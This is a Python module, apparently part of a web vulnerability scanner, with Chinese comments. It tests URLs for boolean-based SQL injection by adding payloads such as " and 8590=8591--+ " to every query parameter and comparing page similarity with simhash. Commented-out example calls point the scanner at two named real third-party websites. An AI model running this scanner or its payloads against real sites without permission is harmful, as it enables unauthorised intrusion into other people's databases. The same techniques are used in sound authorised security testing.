import urllib.parse as urlparse
from changanya.simhash import Simhash
import core

def IsSimilarPage(res1, res2, radio):
    '''
    计算页面相似度函数
    '''
    if res1 is None or res2 is None:
        return False
    simhash1 = Simhash(str(res1))
    simhash2 = Simhash(str(res2))

    calc_radio = simhash1.similarity(simhash2)
    # print("两个页面的相似度为:%s" % (calc_radio))
    if calc_radio >= radio and calc_radio<0.99:
        return True
    else:
        return False

def BoolIn(domain,queries,old_html):
    payloads= (" and 8590=8591--+","' and 8590=8591--+",'''" and 8590=8591--+''',") and 8590=8591--+","') and 8590=8591--+",'''") and 8590=8591--+''')
    for payload in payloads:
        website = domain + "?" + ("&".join([param + payload for param in queries]))
        # print(website)
        source = core.gethtml(website)
        if source and IsSimilarPage(source,old_html,radio=0.3):
            return True,"unknown",website
    return False,None,None

# def InjectionControl(url):
#     old_html=core.gethtml(url)
#     domain = url.split("?")[0]
#     #获取域名和参数，用来构建payload
#     queries = urlparse.urlparse(url).query.split("&")
#     if old_html or not any(queries):
#         BoolIn(domain,queries,old_html)

# injection_control("https://www.ewant.org/local/school/singlelist.php?id=90")
# injection_control("http://www.titanfine.com/about.php?id=4")